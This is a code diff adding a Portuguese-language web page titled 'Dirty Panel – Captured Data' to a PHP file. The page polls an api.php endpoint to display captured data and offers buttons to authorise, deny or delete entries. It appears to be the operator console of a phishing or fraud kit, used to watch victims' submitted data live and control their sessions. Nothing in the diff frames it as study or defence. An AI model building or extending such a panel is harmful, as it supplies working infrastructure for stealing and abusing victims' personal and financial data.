@@ -32,3 +32,37 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     }
 }
 ?>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Painel Sujo</title>
+  <style>
+    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    button { margin: 5px; padding: 10px; }
+    .box { background: #222; padding: 20px; border: 1px solid #0f0; }
+  </style>
+</head>
+<body>
+  <h2>Painel Sujo – Dados Capturados</h2>
+  <div class="box" id="dados">Carregando...</div>
+  <button onclick="setStatus('autorizado')">Autorizar</button>
+  <button onclick="setStatus('negado')">Negar</button>
+  <button onclick="setStatus('excluir')">Excluir</button>
+
+  <script>
+    async function carregar() {
+      let r = await fetch('api.php?action=get');
+      let j = await r.json();
+      document.getElementById('dados').innerText = JSON.stringify(j, null, 2);
+    }
+
+    async function setStatus(s) {
+      await fetch('api.php?action=set&status=' + s);
+      alert('Status definido: ' + s);
+    }
+
+    setInterval(carregar, 2000);
+    carregar();
+  </script>
+</body>
+</html>
